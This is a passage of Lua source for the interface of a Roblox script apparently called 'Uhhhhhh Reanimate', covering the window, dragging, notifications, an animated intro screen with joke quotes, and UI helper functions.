	SaveData.UIThemeUserDefined = nil
end
SaveData.UITheme = SaveData.UITheme or 1
SetUITheme(SaveData.UITheme, true)

local CracktroFrameText = "Uhhhhhh Reanimate V" .. UhhhhhhVersion
local UIMainWindow, WindowContent do
	UIMainWindow = Util.Instance("Frame", UIMainFrame)
	UIMainWindow.Active = true
	UIMainWindow.AnchorPoint = Vector2.new(0.5, 0.5)
	UIMainWindow.Position = UDim2.new(0.5, 0, 0.5, 0)
	UIMainWindow.Size = UDim2.new(0, 360, 0, 240)
	UIMainWindow.BackgroundTransparency = 0
	UIMainWindow.BackgroundColor3 = Color3.new(1, 1, 1)
	UIMainWindow.BorderSizePixel = 0
	Stylize(UIMainWindow, {
		Glow = true
	})
	local _clicksndclicked = false
	UserInputService.InputEnded:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			_clicksndclicked = false
		end
	end)
	local function _registerclicksnd(v)
		if v:GetAttribute("ClickSnd") then return end
		v:SetAttribute("ClickSnd", true)
		v.InputBegan:Connect(function(input)
			if _clicksndclicked then return end
			if input.UserInputState ~= Enum.UserInputState.Begin then return end
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				UISound.Click:Play()
				_clicksndclicked = true
			end
		end)
	end
	_registerclicksnd(UIMainWindow)
	UIMainWindow.DescendantAdded:Connect(function(v)
		if v:IsA("GuiObject") then
			_registerclicksnd(v)
		end
	end)
	
	local TopBarFrame = Util.Instance("Frame", UIMainWindow)
	TopBarFrame.Position = UDim2.new(0, 0, 0, 0)
	TopBarFrame.Size = UDim2.new(1, 0, 0, 30)
	TopBarFrame.BackgroundTransparency = 0
	TopBarFrame.BackgroundColor3 = Color3.new(1, 1, 1)
	TopBarFrame.BorderSizePixel = 0
	TopBarFrame.ClipsDescendants = true
	TopBarFrame.ZIndex = 1
	Stylize(TopBarFrame)
	
	local TopBarText = Util.Instance("TextLabel", TopBarFrame)
	TopBarText.AnchorPoint = Vector2.new(0, 0.5)
	TopBarText.Position = UDim2.new(0, 8, 0.5, 0)
	TopBarText.Size = UDim2.new(1, -35, 1, 0)
	TopBarText.BackgroundTransparency = 1
	TopBarText.ClipsDescendants = true
	TopBarText.Font = UIFont
	TopBarText.TextColor3 = Color3.new(1, 1, 1)
	TopBarText.TextSize = 20
	TopBarText.TextXAlignment = Enum.TextXAlignment.Left
	TopBarText.Text = "Uhhhhhh Reanimate | v" .. UhhhhhhVersion
	TopBarText.RichText = true
	RegisterTextLabel(TopBarText)
	Util.ForceTextSize(TopBarText)
	Util.ShrinkToFit(TopBarText, 20)
	if (SaveData.SkipIntro and math.random(2) == 1) or os.date("%m %d") ~= "04 01" then
		local quotes = {
			"Ohhhhhh Re-create | v" .. UhhhhhhVersion,
			"jumpscare",
			"you'll never see it coming",
			Player.Name .. "'s Uhhhhhh Session",
			"genesis hat collide releaser admin gui",
			"Delta Executor",
			"optimise the optimised",
			":troll:",
			"solara executor",
			"wait a minute smth aint right",
			"gta6 releaser",
			"HD Admin",
			"The Return Of STEVE's Roserika",
			"HI",
			"<font color=\"#00DDFF\">Oxide</font> Version 67",
			"currentangle v5",
			"patchma hub by <font color=\"#0000FF\">MyWorld</font>",
			"Genesis FE with extra steps",
			"Gugu Gaga",
			"Half Life 3 Releaser",
			"hatdrop hub",
			"uhhhh hub",
			"Emperyan Reanimate",
			"<font color=\"#0000FF\">IM BLUE BADA DEE BADA DIE</font>",
			"Delta Reanimate | v" .. UhhhhhhVersion,
		}
		if os.date("%m") == "12" and math.random(4) == 1 then
			quotes = {
				"ho ho ho",
				"dess from deltarune",
				"jesus christmas",
				"Happy Xmas, " .. Player.Name,
				"Razor1911 says... SOCIALIZE!",
				"UHHHHHHHHHHHHHHHHHHHHHHHHHHHH",
				"its cold outside get in here",
				"christmas tree builder",
				"UHHHH]",
			}
		end
		if os.date("%m") == "01" and math.random(4) == 1 then
			quotes = {
				"new year new me",
				"HAVE A HAPPY NEW YEAR",
				"A NEW YEAR??",
				"New Years, " .. Player.Name,
				"did u explode yet?",
				"KEEP YER KIDS SAFE FROM FIREWORK",
				"kaboom? yes rico, kaboom.",
			}
		end
		TopBarText.Text = quotes[math.random(1, #quotes)]
		task.delay(2, function()
			TopBarText.Text = "Uhhhhhh Reanimate | v" .. UhhhhhhVersion
		end)
	end
	
	local TopBarClose = Util.Instance("TextButton", TopBarFrame)
	TopBarClose.AnchorPoint = Vector2.new(1, 0)
	TopBarClose.Position = UDim2.new(1, 0, 0, 0)
	TopBarClose.Size = UDim2.new(0, 30, 1, 0)
	TopBarClose.BackgroundTransparency = 1
	TopBarClose.Text = ""
	do
		local A = Util.Instance("Frame", TopBarClose)
		A.AnchorPoint = Vector2.new(0.5, 0.5)
		A.Position = UDim2.new(0.5, 0, 0.5, 0)
		A.Size = UDim2.new(0, 16, 0, 2)
		A.Rotation = 0
		A.BackgroundTransparency = 0
		A.BackgroundColor3 = UITextColor.Value
		A.BorderSizePixel = 0
		A.Name = "A"
		A = Util.Instance("Frame", A)
		A.AnchorPoint = Vector2.new(0.5, 0.5)
		A.Position = UDim2.new(0.5, 0, 0.5, 0)
		A.Size = UDim2.new(0, 2, 0, 0)
		A.Rotation = 0
		A.BackgroundTransparency = 0
		A.BackgroundColor3 = UITextColor.Value
		A.BorderSizePixel = 0
		A.Name = "B"
		UITextColor.Changed:Connect(function(val)
			TopBarClose.A.BackgroundColor3 = val
			TopBarClose.A.B.BackgroundColor3 = val
		end)
	end
	
	WindowContent = Util.Instance("Frame", UIMainWindow)
	WindowContent.Position = UDim2.new(0, 0, 0, 30)
	WindowContent.Size = UDim2.new(1, 0, 1, -35)
	WindowContent.BackgroundTransparency = 1
	WindowContent.ClipsDescendants = true
	WindowContent.ZIndex = 0
	
	local MainWindowClosed = false
	local MainWindowTweening = false
	local MainWindowPosOpen = nil
	local MainWindowPosClose = nil
	if SaveData.WindowClosedPosition then
		MainWindowPosClose = UDim2.new(unpack(SaveData.WindowClosedPosition))
	end
	if MainWindowPosClose and (MainWindowPosClose.X.Scale < 0 or MainWindowPosClose.X.Scale > 1) then
		MainWindowPosClose = nil
	end
	if MainWindowPosClose and (MainWindowPosClose.Y.Scale < 0 or MainWindowPosClose.Y.Scale > 1) then
		MainWindowPosClose = nil
	end
	TopBarClose.Activated:Connect(function()
		if MainWindowTweening then return end
		MainWindowTweening = true
		MainWindowClosed = not MainWindowClosed
		if MainWindowClosed then
			MainWindowPosOpen = UIMainWindow.Position
			TweenService:Create(UIMainWindow, UITweenInfo, {
				Position = MainWindowPosClose,
				Size = UDim2.fromOffset(112, 30)
			}):Play()
			TweenService:Create(TopBarClose.A, UITweenInfo, {
				Rotation = 180
			}):Play()
			TweenService:Create(TopBarClose.A.B, UITweenInfo, {
				Size = UDim2.new(0, 2, 0, 16)
			}):Play()
			task.delay(0.6, function()
				WindowContent.Visible = false
				MainWindowTweening = false
			end)
		else
			WindowContent.Visible = true
			MainWindowPosClose = UIMainWindow.Position
			SaveData.WindowClosedPosition = {MainWindowPosClose.X.Scale, MainWindowPosClose.X.Offset, MainWindowPosClose.Y.Scale, MainWindowPosClose.Y.Offset}
			TweenService:Create(UIMainWindow, UITweenInfo, {
				Position = MainWindowPosOpen,
				Size = UDim2.fromOffset(360, 240)
			}):Play()
			TweenService:Create(TopBarClose.A, UITweenInfo, {
				Rotation = 0
			}):Play()
			TweenService:Create(TopBarClose.A.B, UITweenInfo, {
				Size = UDim2.new(0, 2, 0, 0)
			}):Play()
			task.delay(0.6, function()
				MainWindowTweening = false
			end)
		end
		WindowContent.Active = not MainWindowClosed
		WindowContent.Interactable = not MainWindowClosed
	end)
	
	local dragref = nil
	local offset = Vector2.new(0, 0)
	local dragtarget = nil
	RunService.RenderStepped:Connect(function(dt)
		if not dragtarget then return end
		if MainWindowTweening then
			dragtarget = nil
			return
		end
		local current = Util.UDim2ToVector2Scale(UIMainWindow.Position)
		local nextpos = current:Lerp(dragtarget, 1 - math.exp(-28 * dt))
		if (nextpos - dragtarget).Magnitude < 0.0002 then
			nextpos = dragtarget
			if not dragref then
				dragtarget = nil
			end
		end
		UIMainWindow.Position = Util.Vector2ToUDim2Scale(nextpos)
	end)
	TopBarFrame.InputBegan:Connect(function(input)
		if dragref then return end
		if input.UserInputState ~= Enum.UserInputState.Begin then return end
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			WindowContent.Interactable = false
			local screen = Util.GetScreenSize()
			local ch = (Vector2.new(input.Position.X, input.Position.Y) + SCREENGUI.AbsolutePosition) / screen
			offset = Util.UDim2ToVector2Scale(UIMainWindow.Position) - ch
			dragref = input
		end
	end)
	UserInputService.InputChanged:Connect(function(input)
		if dragref then
			if input.UserInputType == Enum.UserInputType.MouseMovement or (input.UserInputType == Enum.UserInputType.Touch and dragref == input) then
				local screen = Util.GetScreenSize()
				local ch = (Vector2.new(input.Position.X, input.Position.Y) + SCREENGUI.AbsolutePosition) / screen
				local pos = ch + offset
				local dowsize = Util.UDim2ToVector2Offset(UIMainWindow.Size)
				local imjollx = (dowsize.X * 0.5 - 100) / screen.X
				local imjolly = dowsize.Y * -0.5 / screen.Y
				local boxy = 31 / screen.Y
				pos = Vector2.new(
					math.clamp(pos.X, -imjollx, 1 + imjollx),
					math.clamp(pos.Y, -imjolly, 1 - imjolly - boxy)
				)
				dragtarget = pos
			end
		end
	end)
	UserInputService.InputEnded:Connect(function(input)
		if dragref and dragref == input then
			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
				WindowContent.Interactable = true
				dragref = nil
			end
		end
	end)
end

local _funcrefreshes = {}
local function AddToRenderStep(func, linkto)
	table.insert(_funcrefreshes, func)
	if linkto then
		linkto.Destroying:Connect(function()
			local i = table.find(_funcrefreshes, func)
			if i then
				table.remove(_funcrefreshes, i)
			end
		end)
	end
	return func
end
RunService:BindToRenderStep("Uhhhhhh_Render" .. Util.RandomString(), Enum.RenderPriority.Last.Value - 69, function(dt)
	_totalrendertime += dt
	StepUIThemeBlend(dt)
	UpdateGrads(_totalrendertime)
	WindowContent.Visible = UIMainWindow.Size.Y.Offset > 35
	for _,func in _funcrefreshes do
		local s, e = pcall(func, _totalrendertime, dt)
		if not s then warn(e) end
	end
end)

do
	local uinotif = {
		Text = "hi",
		Progress = -1,
		LastNotif = -67,
		Animation = 1,
		ProgressSm = 0,
	}
	Util.UINotify = function(text, prog)
		uinotif.Text, uinotif.Progress = text, prog or 1
		uinotif.LastNotif = _totalrendertime
	end
	local UINotifyFrame = Instance.new("Frame", UIMainFrame)
	UINotifyFrame.AnchorPoint = Vector2.new(0.5, 0)
	UINotifyFrame.Position = UDim2.new(0.5, 0, 1, 10)
	UINotifyFrame.Size = UDim2.new(0, 300, 0, 30)
	UINotifyFrame.BackgroundTransparency = 0
	UINotifyFrame.BackgroundColor3 = Color3.new(1, 1, 1)
	UINotifyFrame.BorderSizePixel = 0
	UINotifyFrame.Visible = false
	UINotifyFrame.ZIndex = -1
	Stylize(UINotifyFrame, {
		Glow = true,
	})
	local Progress = Instance.new("Frame", UINotifyFrame)
	Progress.AnchorPoint = Vector2.new(0.5, 0)
	Progress.Position = UDim2.new(0.5, 0, 0, 0)
	Progress.Size = UDim2.new(1, -10, 1, 0)
	Progress.BackgroundTransparency = 1
	Progress.BackgroundColor3 = Color3.new(1, 1, 1)
	Progress.BorderSizePixel = 0
	local ProgressTop = Instance.new("Frame", Progress)
	ProgressTop.AnchorPoint = Vector2.new(0.5, 0)
	ProgressTop.Position = UDim2.new(0.5, 0, 0, 0)
	ProgressTop.Size = UDim2.new(0, 0, 0, 4)
	ProgressTop.BackgroundTransparency = 0
	ProgressTop.BackgroundColor3 = Color3.new(1, 1, 1)
	ProgressTop.BorderSizePixel = 0
	local ProgressBot = Instance.new("Frame", Progress)
	ProgressBot.AnchorPoint = Vector2.new(0.5, 1)
	ProgressBot.Position = UDim2.new(0.5, 0, 1, 0)
	ProgressBot.Size = UDim2.new(0, 0, 0, 4)
	ProgressBot.BackgroundTransparency = 0
	ProgressBot.BackgroundColor3 = Color3.new(1, 1, 1)
	ProgressBot.BorderSizePixel = 0
	local NotifyText = Util.Instance("TextLabel", UINotifyFrame)
	NotifyText.AnchorPoint = Vector2.new(0.5, 0.5)
	NotifyText.Position = UDim2.new(0.5, 0, 0.5, 0)
	NotifyText.Size = UDim2.new(1, 0, 0, 20)
	NotifyText.BackgroundTransparency = 1
	NotifyText.ClipsDescendants = true
	NotifyText.Font = UIFont
	NotifyText.TextColor3 = Color3.new(1, 1, 1)
	NotifyText.TextSize = 18
	NotifyText.TextXAlignment = Enum.TextXAlignment.Center
	NotifyText.Text = ""
	RegisterTextLabel(NotifyText)
	Util.ShrinkToFit(NotifyText, 18)
	AddToRenderStep(function(t, dt)
		if t - uinotif.LastNotif < 4 or uinotif.Progress < 1 then
			uinotif.Animation = math.max(0, uinotif.Animation - dt * 2)
		else
			uinotif.Animation = math.min(1, uinotif.Animation + dt * 2)
		end
		if uinotif.Animation < 1 then
			UINotifyFrame.Visible = true
			UINotifyFrame.Position = UIMainWindow.Position + UDim2.new(0, 0, 0, UIMainWindow.Size.Y.Offset / 2 + 10 + math.pow(uinotif.Animation, 3) * -40)
			if uinotif.Progress >= 1 then
				Progress.BackgroundTransparency = math.min(t - uinotif.LastNotif, 0.5) * 2 * 0.3 + 0.7
			else
				Progress.BackgroundTransparency = 1
			end
			local c = GetUIColor(t)
			local s = math.sin(t * 3) * 0.5 + 0.5
			if uinotif.Progress > 0 then
				uinotif.ProgressSm = uinotif.Progress + (uinotif.ProgressSm - uinotif.Progress) * math.exp(-16 * dt)
				ProgressTop.BackgroundTransparency = 0
				ProgressBot.BackgroundTransparency = 0
				ProgressTop.Size = UDim2.new(uinotif.ProgressSm, 0, 0, 4)
				ProgressBot.Size = UDim2.new(uinotif.ProgressSm, 0, 0, 4)
			else
				uinotif.ProgressSm = 1
				ProgressTop.BackgroundTransparency = s
				ProgressBot.BackgroundTransparency = s
				ProgressTop.Size = UDim2.new(1, 0, 0, 4)
				ProgressBot.Size = UDim2.new(1, 0, 0, 4)
			end
			ProgressTop.BackgroundColor3 = c
			ProgressBot.BackgroundColor3 = c
			NotifyText.Text = uinotif.Text
		else
			UINotifyFrame.Visible = false
		end
	end, UINotifyFrame)
end

local CracktroFrame = Util.Instance("Frame", WindowContent)
CracktroFrame.Active = true
CracktroFrame.AnchorPoint = Vector2.new(0.5, 0.5)
CracktroFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
CracktroFrame.Size = UDim2.new(0, 360, 0, 205)
CracktroFrame.BackgroundTransparency = 0
CracktroFrame.BackgroundColor3 = Color3.new(0, 0, 0)
CracktroFrame.BorderSizePixel = 1
CracktroFrame.BorderColor3 = Color3.new(1, 1, 1)
CracktroFrame.ZIndex = 10
CracktroFrame.ClipsDescendants = true
AddToRenderStep(function(t)
	CracktroFrame.BorderColor3 = GetUIColor(t)
	CracktroFrame.BackgroundColor3 = GetUIBGColor(t)
end, CracktroFrame)

do -- homepage
	local TriforceClip = Util.Instance("CanvasGroup", CracktroFrame)
	TriforceClip.Position = UDim2.new(0, 0, 0, 0)
	TriforceClip.Size = UDim2.new(1, 0, 1, 0)
	TriforceClip.BackgroundTransparency = 1
	TriforceClip.ZIndex = 0

	local Glowy = Util.Instance("ImageLabel", CracktroFrame)
	Glowy.AnchorPoint = Vector2.new(0.5, 0.5)
	Glowy.Position = UDim2.new(0.5, 0, 0.5, 0)
	Glowy.Size = UDim2.new(0, 260, 0, 260)
	Glowy.BackgroundTransparency = 1
	Glowy.Image = Util.GetCDNAsset("lightinursoul.graphic.png")
	Glowy.ImageColor3 = UITextColor.Value
	Glowy.ImageTransparency = 0.7
	Glowy.ZIndex = -2

	local Triforce = Util.MakeTriforce(3, Color3.new(1, 0.7, 0), 0)
	Triforce.AnchorPoint = Vector2.new(0.5, 0.5)
	Triforce.Position = UDim2.new(0.5, 0, 0.5, 0)
	Triforce.Size = UDim2.new(0, 160, 0, 160)
	Triforce.Parent = TriforceClip

	local particles = {}
	local ps = 128
	local psc = Color3.new(1, 0.9, 0)
	for i=1, ps do
		local r = (i / ps) * 2 * math.pi
		local p = Util.Instance("Frame", CracktroFrame)
		p.AnchorPoint = Vector2.new(0.5, 0.5)
		p.Size = UDim2.fromOffset(2, 2)
		p.BackgroundColor3 = psc
		p.BackgroundTransparency = 0
		p.BorderSizePixel = 0
		p.ZIndex = -1
		p.Visible = false
		table.insert(particles, {
			p, Vector2.new(math.sin(r), math.cos(r)) * 8,
			Vector2.new(math.random(-128, 128), math.random(-128, 128)),
			math.random() * 2 - 1, false, -1
		})
	end

	local trivel = 360
	local oldpbl = 0

	local text = Util.MakeText(CracktroFrameText)
	text.AnchorPoint = Vector2.new(0.5, 1)
	text.Position = UDim2.new(0.5, 0, 1, -25)
	text.ZIndex = 3
	text.Parent = CracktroFrame
	local text0 = Util.MakeText("Discord: discord.gg/NASNUKRBVM")
	text0.AnchorPoint = Vector2.new(0.5, 1)
	text0.Position = UDim2.new(0.5, 0, 1, -17)
	text0.ZIndex = 3
	text0.Parent = CracktroFrame
	local text1 = Util.MakeText("Made by STEVETHEREALONE :" .. (math.random() < 0.333 and "3" or (math.random() < 0.5 and "D" or "P")))
	text1.AnchorPoint = Vector2.new(0.5, 1)
	text1.Position = UDim2.new(0.5, 0, 1, -17)
	text1.ZIndex = 3
	text1.Parent = CracktroFrame
	local text2 = Util.MakeText("Click me to start!")
	text2.AnchorPoint = Vector2.new(0.5, 1)
	text2.Position = UDim2.new(0.5, 0, 1, -17)
	text2.ZIndex = 3
	text2.Parent = CracktroFrame
	Util.SetTextColor(text, UITextColor.Value, 0)
	Util.SetTextColor(text0, UITextColor.Value, 0)
	Util.SetTextColor(text1, UITextColor.Value, 0)
	Util.SetTextColor(text2, UITextColor.Value, 0)
	local quotes = {
		"\"EVERY CLIENT ORBITS A SERVER...\"",
		Player.Name .. ", how is your " .. os.date("%A") .. "?",
		"A great " .. os.date("%A") .. " today, eh?",
		"Hello, " .. Player.Name .. ".",
		"What makes you play at " .. os.date("%I %p") .. "?",
		"You are going to love Uhhhhhh, I just know it.",
		"This script is very \"verbose\".",
		"Written mostly on a mobile phone.",
		"I am pretty new in this community! :D",
		"\"Dreams come true!\"",
		"Idea originated from a dream.",
		"If you love this program, join my Discord!",
		"boredgal was here..",
		"gugu gaga ultimate",
		"Kleiner me to start!",
		"Spongebob squarepants",
		"I'm a Razor 1911 'fan' btw!",
	}
	local text3 = nil
	local text3mustchange = false
	local function changequote()
		if text3 then text3:Destroy() end
		text3 = Util.MakeText(quotes[math.random(1, #quotes)])
		text3.AnchorPoint = Vector2.new(0.5, 1)
		text3.Position = UDim2.new(0.5, 0, 1, -17)
		text3.ZIndex = 3
		text3.Parent = CracktroFrame
		Util.SetTextColor(text3, UITextColor.Value, 0)
	end
	changequote()
	UITextColor.Changed:Connect(function(val)
		Util.SetTextColor(text, val, 0)
		Util.SetTextColor(text0, val, 0)
		Util.SetTextColor(text1, val, 0)
		Util.SetTextColor(text2, val, 0)
		Util.SetTextColor(text3, val, 0)
	end)

	local PositionProcessor = {
		function(i, v, dt, pbl, spike)
			local inst, pos, vel, zind, lvis, lzind = unpack(v)
			local d = pos.Magnitude
			if d > 0 then
				local r = math.atan2(pos.X / d, pos.Y / d)
				local a = math.pi * 0.375
				local out = Vector2.new(math.sin(r + a), math.cos(r + a))
				local tp = out * (40 + pbl / 12)
				local tv = (tp - pos) * 2
				vel = tv:Lerp(vel, math.exp(-2 * dt))
				if math.random() < 0.01 then
					vel += Vector2.new(math.random(-64, 64), math.random(-64, 64))
				end
				if spike > 64 then
					vel += out * 64 * math.random()
				end
				pos += vel * dt
			else
				pos += Vector2.new(0, 10)
			end
			v[2], v[3] = pos, vel
			return Vector3.new(zind * pos.Magnitude / 6, pos.Y, pos.X)
		end,
		function(i, v, dt, pbl, spike)
			local inst, pos, vel, zind, lvis, lzind = unpack(v)
			local a = i / ps
			local s = (a * 6) % 1
			local r = (a + s / 8) * 2 * math.pi + os.clock() * 2 + zind * math.pi * 0.125 * (pbl / 200) * (1 - s)
			pos = Vector2.new(math.sin(r), math.cos(r)) * s * (100 + pbl / 15)
			v[2], v[3] = pos, Vector2.zero
			return Vector3.new(0, pos.Y, pos.X)
		end,
		function(i, v, dt, pbl, spike)
			local inst, pos, vel, zind, lvis, lzind = unpack(v)
			local a = i / ps
			local b = 1 / 3
			local c = math.sqrt(3) / 2
			local d = {
				{Vector2.new(0, b + c), Vector2.new(-0.5, b)},
				{Vector2.new(-0.5, b), Vector2.new(-1, b - c)},
				{Vector2.new(-1, b - c), Vector2.new(0, b - c)},
				{Vector2.new(0, b - c), Vector2.new(1, b - c)},
				{Vector2.new(1, b - c), Vector2.new(0.5, b)},
				{Vector2.new(0.5, b), Vector2.new(0, b - c)},
				{Vector2.new(0, b - c), Vector2.new(-0.5, b)},
				{Vector2.new(-0.5, b), Vector2.new(0.5, b)},
				{Vector2.new(0.5, b), Vector2.new(0, b + c)},
			}
			local t = a * #d
			local i = math.floor(t) + 1
			local u = t % 1
			if i > #d then
				i = #d
				u = 1
			end
			pos = d[i][1]:Lerp(d[i][2], u) * 150
			local r = os.clock() * 2
			pos = Vector2.new(
				pos.X * math.cos(r) - pos.Y * math.sin(r),
				pos.X * math.sin(r) + pos.Y * math.cos(r)
			)
			v[2], v[3] = pos, Vector2.zero
			return Vector3.new(0, pos.Y, pos.X)
		end,
	}
	local currentprocessor = 1

	AddToRenderStep(function(t, dt)
		if Util.IsGuiVisible(CracktroFrame) then
			local pp = PositionProcessor[currentprocessor]
			local CracktroFrameAbsoluteSize = CracktroFrame.AbsoluteSize
			Glowy.ImageColor3 = UITextColor.Value
			Glowy.ImageTransparency = 0.75 + math.sin(((os.clock() / 10) % 2) * math.pi) * 0.05
			local pbl = UISound.Music.PlaybackLoudness
			local spike = math.max(0, (pbl - oldpbl) - 16)
			oldpbl = pbl
			local trivelt = pbl * 2 * dt
			trivel = trivelt + (trivel - trivelt) * math.exp(-8 * dt)
			-- idle spin (40 deg/s) so the triangle still turns when no music is playing;
			-- music loudness (trivel) only adds extra speed on top of it
			Triforce.Rotation = (Triforce.Rotation + trivel + 40 * dt) % 360
			local ring = CFrame.Angles(
				0,
				math.cos(((t / 5) % 2) * math.pi) * math.pi * 0.5,
				(1 - math.cos(((t / 7) % 2) * math.pi)) * math.pi * 0.5
			)
			local fov = 220
			for i,v in particles do
				local inst, pos, vel, zind, lvis, lzind = unpack(v)
				local sp = ring:VectorToWorldSpace(pp(i, v, dt, pbl, spike))
				local z = sp.Z
				local sc = fov / (z + fov)
				sp = Vector2.new(sp.X, sp.Y) * sc
				local nvis, nzind = lvis, lzind
				if z > 1 - fov then
					inst.Position = Util.Vector2ToUDim2Offset(sp + CracktroFrameAbsoluteSize / 2)
					inst.Size = UDim2.fromOffset(sc * 2.5, sc * 2.5)
					--inst.BackgroundColor3 = psc:Lerp(Color3.new(0, 0, 0), math.clamp(z / (fov * 2), 0, 1))
					nvis = true
					if z > 0 then
						nzind = -1
					else
						nzind = 1
					end
				else
					nvis = false
				end
				if lvis ~= nvis then
					inst.Visible = nvis
					v[5] = nvis
				end
				if lzind ~= nzind then
					inst.ZIndex = nzind
					v[6] = nzind
				end
			end
			local textsel = t % 9
			if IsUhhhhhhFullyLoaded then
				textsel = t % 12
			end
			textsel //= 3
			if text3mustchange ~= (textsel == 3) then
				text3mustchange = (textsel == 3)
				if text3mustchange then changequote() end
			end
			if textsel == 0 then
				text0.Visible = true
				text1.Visible = false
				text2.Visible = false
				text3.Visible = false
			elseif textsel == 1 then
				text0.Visible = false
				text1.Visible = true
				text2.Visible = false
				text3.Visible = false
			elseif textsel == 2 then
				text0.Visible = false
				text1.Visible = false
				text2.Visible = false
				text3.Visible = true
			else
				text0.Visible = false
				text1.Visible = false
				text2.Visible = true
				text3.Visible = false
			end
		else
			currentprocessor = math.random(1, #PositionProcessor)
		end
	end, CracktroFrame)
end
task.wait()

local UI = {}
function UI.CreatePage()
	local Frame = Util.Instance("ScrollingFrame", WindowContent)
	Frame.AnchorPoint = Vector2.new(0.5, 0.5)
	Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
	Frame.Size = UDim2.new(0, 360, 0, 205)
	Frame.BackgroundTransparency = 0
	Frame.BackgroundColor3 = Color3.new(0, 0, 0)
	Frame.BorderSizePixel = 1
	Frame.BorderColor3 = Color3.new(1, 1, 1)
	Frame.Visible = true
	Frame.ZIndex = 0
	Frame.AutomaticCanvasSize = Enum.AutomaticSize.Y
	Frame.CanvasSize = UDim2.new(0, 0, 0, 0)
	Frame.ClipsDescendants = true
	AddToRenderStep(function(t)
		Frame.BorderColor3 = GetUIColor(t)
		Frame.BackgroundColor3 = GetUIBGColor(t)
	end, Frame)
	Frame.ScrollingDirection = Enum.ScrollingDirection.Y
	Frame.ScrollBarThickness = 3
	Frame.ElasticBehavior = Enum.ElasticBehavior.Always
	Frame.TopImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Frame.MidImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Frame.BottomImage = "rbxasset://textures/ui/Scroll/scroll-middle.png"
	Frame.ScrollBarImageTransparency = 0.5
	Frame.ScrollBarImageColor3 = UITextColor.Value
	Util.LinkDestroyI2C(Frame, UITextColor.Changed:Connect(function(val)
		Frame.ScrollBarImageColor3 = val
	end))
	local Padding = Util.Instance("UIPadding", Frame)
	Padding.PaddingTop = UDim.new(0, 5)
	Padding.PaddingBottom = UDim.new(0, 0)
	Padding.PaddingLeft = UDim.new(0, 0)
	Padding.PaddingRight = UDim.new(0, 0)
	local UIList = Util.Instance("UIListLayout", Frame)
	UIList.FillDirection = Enum.FillDirection.Vertical
	UIList.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIList.VerticalAlignment = Enum.VerticalAlignment.Top
	UIList.Padding = UDim.new(0, 0)
	UIList.SortOrder = Enum.SortOrder.LayoutOrder
	return Frame
end
function UI.CreateText(parent, text, size, alignment)
	local margin = 5
	local Container = Util.Instance("Frame", parent)
	Container.AnchorPoint = Vector2.new(0.5, 0)
	Container.Size = UDim2.new(1, 0, 0, 65536)
	Container.BackgroundTransparency = 1
	Container.LayoutOrder = #parent:GetChildren()
	local Text = Util.Instance("TextLabel", Container)
	Text.Position = UDim2.new(0, margin, 0, 0)
	Text.Size = UDim2.new(1, margin * -2, 1, -margin + 1)
	Text.BackgroundTransparency = 1
	Text.RichText = true
	Text.Font = UIFont
	Text.TextColor3 = Color3.new(1, 1, 1)
	Text.TextTransparency = 0
	Text.TextXAlignment = alignment
	Text.TextYAlignment = Enum.TextYAlignment.Top
	Text.TextWrapped = true
	Text.TextSize = size
	RegisterTextLabel(Text)
	local function update()
		local x = parent.AbsoluteSize.X
		local size = TextService:GetTextSize(Text.ContentText, Text.TextSize, Text.Font, Vector2.new(x - margin * 2, math.huge))
		Container.Size = UDim2.new(1, 0, 0, size.Y + margin)
	end
	Text.Text = text
	update()
	Text.Changed:Connect(update)
	return Text
end
function UI.CreateSeparator(parent)
	local Container = Util.Instance("Frame", parent)
	Container.AnchorPoint = Vector2.new(0.5, 0)
	Container.Size = UDim2.new(1, 0, 0, 7)
	Container.BackgroundTransparency = 1
	Container.LayoutOrder = #parent:GetChildren()
	local Sep = Util.Instance("Frame", Container)
	Sep.AnchorPoint = Vector2.new(0.5, 0.5)
	Sep.Position = UDim2.new(0.5, 0, 0.5, 0)
	Sep.Size = UDim2.new(1, -8, 0, 1)
	Sep.BackgroundColor3 = UITextColor.Value
	Sep.BackgroundTransparency = 0.8
	Sep.BorderSizePixel = 0
	Util.LinkDestroyI2C(Sep, UITextColor.Changed:Connect(function(val)
		Sep.BackgroundColor3 = val
	end))
end
function UI.CreateButton(parent, text, size)
	local margin = 5
	local Container = Util.Instance("Frame", parent)
	Container.AnchorPoint = Vector2.new(0.5, 0)
	Container.Size = UDim2.new(1, 0, 0, 65536)
	Container.BackgroundTransparency = 1
	Container.LayoutOrder = #parent:GetChildren()
	local Button = Util.Instance("TextButton", Container)
	Button.AnchorPoint = Vector2.new(0, 0)
	Button.Position = UDim2.new(0, margin, 0, margin // 2)
	Button.Size = UDim2.new(1, margin * -2, 1, -margin)
	Button.BackgroundTransparency = 0
	Button.BackgroundColor3 = Color3.new(1, 1, 1)
	Button.BorderSizePixel = 0
	Button.Text = ""
	Button.AutoButtonColor = true
	local ButtonText = Util.Instance("TextLabel", Button)
	ButtonText.AnchorPoint = Vector2.new(0, 0.5)
	ButtonText.Position = UDim2.new(0, 0, 0.5, 0)
	ButtonText.Size = UDim2.new(1, 0, 1, -margin)
	ButtonText.BackgroundTransparency = 1
	ButtonText.RichText = true
	ButtonText.Font = UIFont
	ButtonText.TextColor3 = Color3.new(1, 1, 1)
	ButtonText.TextTransparency = 0
	ButtonText.TextXAlignment = Enum.TextXAlignment.Center
	ButtonText.TextYAlignment = Enum.TextYAlignment.Center
	ButtonText.TextWrapped = true
	ButtonText.TextSize = size
	RegisterTextLabel(ButtonText)
	Stylize(Button)
	local function update()
		local x = parent.AbsoluteSize.X
		local size = TextService:GetTextSize(ButtonText.ContentText, ButtonText.TextSize, ButtonText.Font, Vector2.new(x - margin * 2, math.huge))
		Container.Size = UDim2.new(1, 0, 0, size.Y + margin * 2)
	end
	ButtonText.Text = text
	update()
	ButtonText.Changed:Connect(update)
	return Button, ButtonText
end
function UI.CreateSwitch(parent, text, value)
	local margin = 5
	local switchsize = 50
	local Container = Util.Instance("Frame", parent)
